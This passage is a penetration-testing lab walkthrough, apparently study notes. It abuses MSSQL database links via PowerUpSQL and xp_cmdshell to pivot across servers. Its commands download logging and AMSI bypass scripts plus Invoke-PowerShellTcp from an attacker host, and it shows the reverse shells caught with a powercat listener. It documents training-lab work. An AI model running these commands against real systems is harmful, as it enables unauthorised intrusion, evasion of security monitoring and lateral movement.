Instance         : us-mssql.us.techcorp.local
DomainAccountSid : 150000052100019514814212226574150140238186983400
DomainAccount    : US-MSSQL$
DomainAccountCn  : US-MSSQL
Service          : MSSQLSvc
Spn              : MSSQLSvc/us-mssql.us.techcorp.local
LastLogon        : 12/12/2023 12:31 AM
Description      :
```
- From the output above we realize that there are no other MSSQL servers on the domain. We can find more information about this specific server.
```powershell
PS C:\Auditor> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
VERBOSE: us-mssql.us.techcorp.local : Connection Success.


ComputerName           : us-mssql.us.techcorp.local
Instance               : US-MSSQL
DomainName             : US
ServiceProcessID       : 2208
ServiceName            : MSSQLSERVER
ServiceAccount         : US\dbservice
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : US\studentuser57
IsSysadmin             : No
ActiveSessions         : 1
```
- We can check the accessibility of `us\studentuser57` at `US-MSSQL`.
```powershell
PS C:\Auditor> Get-SQLInstanceDomain | Get-SQLConnectionTest

ComputerName               Instance                   Status
------------               --------                   ------
us-mssql.us.techcorp.local us-mssql.us.techcorp.local Accessible
```
- We can check for non-default databases on `US-MSSQL` that might have interesting data in them.
```powershell
PS C:\Auditor> Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults -Verbose
VERBOSE: us-mssql.us.techcorp.local : Connection Success.
```
- Nothing interesting came up so far. We should enumerate for Database Links that could link `US-MSSQL` with databases on other forests.
```powershell
PS C:\Auditor> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Verbose
VERBOSE: us-mssql.us.techcorp.local : Connection Success.
VERBOSE: us-mssql.us.techcorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: US-MSSQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: US-MSSQL
VERBOSE:  - Link Login: US\studentuser57
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: 192.168.23.25
VERBOSE: us-mssql.us.techcorp.local : Connection Success.
VERBOSE: us-mssql.us.techcorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DB-SQLPROD
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: US-MSSQL -> 192.168.23.25
VERBOSE:  - Link Login: dbuser
VERBOSE:  - Link IsSysAdmin: 1
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DB-SQLSRV
VERBOSE: us-mssql.us.techcorp.local : Connection Success.
VERBOSE: us-mssql.us.techcorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DB-SQLSRV
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: US-MSSQL -> 192.168.23.25 -> DB-SQLSRV
VERBOSE:  - Link Login: sa
VERBOSE:  - Link IsSysAdmin: 1
VERBOSE:  - Link Count: 0
VERBOSE:  - Links on this server:


Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser57
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :
```
- We can see the following:
	-  `US-MSSQL` has a database link with `DB-SQLPROD` as `dbuser`
	-  `DB-SQLPROD` has a database link with `DB-SQLSRV` as `sa`
- Let' check for command execution privileges on the linked databases through `xp_cmdshell`.
```powersell
PS C:\Auditor> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query "exec master..xp_cmdshell 'whoami'"


Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser57
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery : {nt service\mssqlserver, }
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :
```
- We can see that we have command execution privileges on `DB-SQLPROD` as `nt service\mssqlserver`, which is a service account. We can leverage that to execute a PowerShell reverse shell on that server. We will host the needed files on HFS and start a listener on our `STUDENT57`.
```powershell
PS C:\Auditor> ipmo .\powercat.ps1
PS C:\Auditor> powercat -l -v -p 443 -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
```
- Then we will execute the command to get the reverse shell on the target server.
```powershell
PS C:\Auditor> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.57/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.57/amsibypasscrtp.txt);iex (iwr -UseBasicParsing http://192.168.100.57/Invoke-PowerShellTcp.ps1)"''' -QueryTarget db-sqlprod
```
- On our listener, we can will get a call back from the target server (we might need to press "Enter" a few times).
```powershell
VERBOSE: Connection from [192.168.23.25] port  [tcp] accepted (source port 51545)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Windows PowerShell running as user MSSQLSERVER on DB-SQLPROD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name, Domain

Name       Domain
----       ------
DB-SQLPROD db.local
```
- We have now access to `db.local` which we can start enumerating at [[2. Lab Walkthrough/7th Forest (db.local)/db.local/1. Domain Enumeration|1. Domain Enumeration]].
- We noticed from [[2. Lab Walkthrough/1st Forest (techcorp.local)/1. us.techcorp.local/1. Domain Enumeration|1. Domain Enumeration]] that the link from `DB-SQLPOD` to `DB-SQLSRV` is configured to use `sa`. This means that we can enable `xp_cmdshell` on `DB-SQLSRV` from the reverse shell on `DB-SQLPOD` and be able to execute commands there as well.
```powershell
PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"

PS C:\Windows\system32> Import-Module : The specified module 'SQLASCmdlets' was not loaded because no valid module file was found in any
module directory.
At C:\Program Files (x86)\Microsoft SQL Server\140\Tools\PowerShell\Modules\SQLPS\SqlPsPostScript.ps1:18 char:1
+ Import-Module SQLASCmdlets -ErrorAction SilentlyContinue -Global
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (SQLASCmdlets:String) [Import-Module], FileNotFoundException
    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand

PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"

PS C:\Windows\system32> PS C:\Windows\system32> Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""
PS C:\Windows\system32> Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
```
- From `STUDENT57` we can now check if we have OS command execution privileges at `DB-SQLSRV`.
```powershell
PS C:\Auditor> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query "exec master..xp_cmdshell 'whoami'"


Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser57
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery : {nt service\mssqlserver, }
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery : {db\srvdba, }
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :
```
- We can now obtain a reverse shell on `DB-SQLSRV`.
```powershell
PS C:\Auditor> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.57/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.57/amsibypasscrtp.txt);iex (iwr -UseBasicParsing http://192.168.100.57/Invoke-PowerShellTcp.ps1)"''' -QueryTarget db-sqlsrv
```
- We will catch our reverse shell on our listener (after we exited the previous one).
```powershell
PS C:\Windows\Tasks> whoami /all

USER INFORMATION
----------------

User Name SID
========= ==============================================
db\srvdba S-1-5-21-2781415573-3701854478-2406986946-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes         
========================================== ================ =============================================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                                    Mandatory group, Enabled by default, Enabled group

<snip>
```